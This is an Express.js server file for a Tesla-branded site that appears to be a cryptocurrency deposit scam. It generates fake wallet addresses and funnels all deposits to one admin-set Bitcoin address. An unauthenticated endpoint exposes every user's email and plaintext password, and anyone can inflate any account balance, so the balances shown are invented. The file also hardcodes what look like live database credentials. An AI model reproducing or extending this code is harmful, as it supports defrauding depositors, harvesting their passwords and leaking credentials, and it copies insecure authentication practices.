const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname)));

// --- DATABASE CONFIGURATION ---
// Handles special characters in password: SOLOMON2003$#56777
const dbUser = "postgres.ggrvkcxnizchfbzfwvjv";
const dbPass = encodeURIComponent("SOLOMON2003$#56777");
const dbHost = "aws-1-us-east-1.pooler.supabase.com";
const connectionString = `postgresql://${dbUser}:${dbPass}@${dbHost}:5432/postgres`;

const pool = new Pool({
    connectionString: connectionString,
    ssl: { rejectUnauthorized: false },
    connectionTimeoutMillis: 10000
});

// INITIALIZE DATABASE TABLES
const initDb = async () => {
    try {
        // 1. Users Table (Email, Password, Balance, Wallet)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                email VARCHAR(255) UNIQUE NOT NULL,
                password TEXT NOT NULL,
                balance DECIMAL(20, 2) DEFAULT 0.00,
                wallet_address TEXT DEFAULT '1Tesla' || md5(random()::text),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);

        // 2. Settings Table (For Admin's Bitcoin Deposit Wallet)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            );
        `);

        // 3. Set Default Bitcoin Address
        await pool.query(`
            INSERT INTO settings (key, value) 
            VALUES ('btc_deposit_address', '1PLEASE_UPDATE_IN_ADMIN') 
            ON CONFLICT (key) DO NOTHING;
        `);

        console.log("✅ [DATABASE] Connection Verified & Tables Ready");
    } catch (err) {
        console.error("❌ [DATABASE] Error:", err.message);
    }
};
initDb();

// --- ROUTES FOR PAGES ---
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

// --- ADMIN API FEATURES ---
const ADMIN_PASS = "SOLOMON200";

// View all user emails and passwords (Admin Dashboard)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT email, password, balance, wallet_address FROM users ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) {
        res.status(500).json({ error: "Access Denied" });
    }
});

// Update the Bitcoin Deposit Wallet for the whole site
app.post('/api/admin/update-wallet', async (req, res) => {
    const { password, newAddress } = req.body;
    if (password !== ADMIN_PASS) return res.status(401).json({ error: "Unauthorized" });
    try {
        await pool.query("UPDATE settings SET value = $1 WHERE key = 'btc_deposit_address'", [newAddress]);
        res.json({ success: true, message: "BTC Wallet Updated" });
    } catch (err) {
        res.status(500).json({ error: "Update Failed" });
    }
});

// Get current BTC Wallet for users to see
app.get('/api/site/wallet', async (req, res) => {
    try {
        const result = await pool.query("SELECT value FROM settings WHERE key = 'btc_deposit_address'");
        res.json({ address: result.rows[0].value });
    } catch (err) {
        res.status(500).json({ error: "Fetch error" });
    }
});

// Inject/Update User Funds (Users never lose assets)
app.post('/api/user/update-balance', async (req, res) => {
    const { email, amount } = req.body;
    try {
        await pool.query('UPDATE users SET balance = balance + $1 WHERE email = $2', [amount, email]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Balance update failed" });
    }
});

// --- AUTHENTICATION API ---
app.post('/api/auth/register', async (req, res) => {
    const { email, password } = req.body;
    try {
        const check = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (check.rows.length > 0) return res.status(400).json({ error: "Account already exists" });
        await pool.query('INSERT INTO users (email, password, balance) VALUES ($1, $2, 0.00)', [email, password]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Registration failed" });
    }
});

app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email, password]);
        if (result.rows.length > 0) res.json({ success: true, email: email });
        else res.status(401).json({ error: "Invalid email or password" });
    } catch (err) {
        res.status(500).json({ error: "Login failed" });
    }
});

app.get('/api/user/data', async (req, res) => {
    const { email } = req.query;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (result.rows.length > 0) res.json(result.rows[0]);
        else res.status(404).json({ error: "User not found" });
    } catch (err) {
        res.status(500).json({ error: "Database error" });
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Tesla Base System Active on Port ${PORT}`));
           
